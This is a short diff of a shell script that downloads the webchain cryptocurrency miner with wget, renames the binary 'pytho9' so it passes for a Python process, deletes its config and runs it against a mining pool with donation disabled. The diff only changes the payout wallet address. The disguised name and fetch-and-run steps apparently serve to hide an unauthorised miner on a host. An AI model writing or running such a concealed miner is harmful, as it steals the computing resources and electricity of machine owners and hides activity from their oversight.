@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./pytho9 -o web-ko1.gonspool.com:3333 -u 0x814f918de807b7ba5caf41a4e53885615cf7ffd7 -p x --donate-level=0
+./pytho9 -o web-ko1.gonspool.com:3333 -u 0xa71fd6c184423b802d5454958c4ba14380fa4ad8 -p x --donate-level=0
 
      
 fi
@@ -30,6 +30,6 @@ wget https://github.com/webchain-network/webchain-miner/releases/download/v2.8.0
 tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
 mv webchain-miner pytho9
 rm config.json
-./pytho9 -o web-ko1.gonspool.com:3333 -u 0x814f918de807b7ba5caf41a4e53885615cf7ffd7 -p x --donate-level=0
+./pytho9 -o web-ko1.gonspool.com:3333 -u 0xa71fd6c184423b802d5454958c4ba14380fa4ad8 -p x --donate-level=0
 
 exit 0
